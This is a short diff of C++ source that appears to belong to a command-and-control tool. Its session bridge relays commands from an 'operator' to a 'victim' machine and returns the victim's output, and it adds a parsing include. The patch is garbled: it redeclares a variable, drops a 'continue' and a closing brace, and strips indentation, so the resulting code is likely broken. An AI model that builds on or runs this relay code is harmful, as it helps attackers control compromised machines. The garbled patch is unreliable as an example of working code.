@@ -5,7 +5,7 @@
 #include "SessionConnectionAuthenticator.hpp"
 #include <SessionHandshake.hpp>
 #include <SessionTransfer.hpp>
-
+#include "Util/Parse.hpp"
 #include <Remote.hpp>
 #include <Server.hpp>
 #include <atomic>
@@ -275,20 +275,20 @@ public:
                             logger::debug("Output Size: [{}]", output_size);
                             op->sendline(output_size);
 
-                            const auto out_size = std::atol(output_size.c_str());
-                            if (out_size > 0) {
-                                if (static_cast<std::size_t>(out_size) > kMaxBridgeOutputBytes) {
-                                    logger::warn("Bridge output size {} exceeds cap", out_size);
-                                    break;
-                                }
-                                const auto output = trim_string(vic->recv(static_cast<std::size_t>(out_size)));
-                                logger::debug("Output from Victim: [{}]", output);
-                                op->send(output);
-                            }
-                            std::this_thread::sleep_for(std::chrono::milliseconds(5));
-                            continue;
-                        }
+                           const auto output_size = trim_string(vic->recvline());
+logger::debug("Output Size: [{}]", output_size);
+op->sendline(output_size);
 
+const auto out_size = std::atol(output_size.c_str());
+if (out_size > 0) {
+    if (static_cast<std::size_t>(out_size) > kMaxBridgeOutputBytes) {
+        logger::warn("Bridge output size {} exceeds cap", out_size);
+        break;
+    }
+    const auto output = trim_string(vic->recv(static_cast<std::size_t>(out_size)));
+    logger::debug("Output from Victim: [{}]", output);
+    op->send(output);
+}
                         vic->sendline(cmd);
 
                         session_handshake::clear_recv_buffer(*vic);
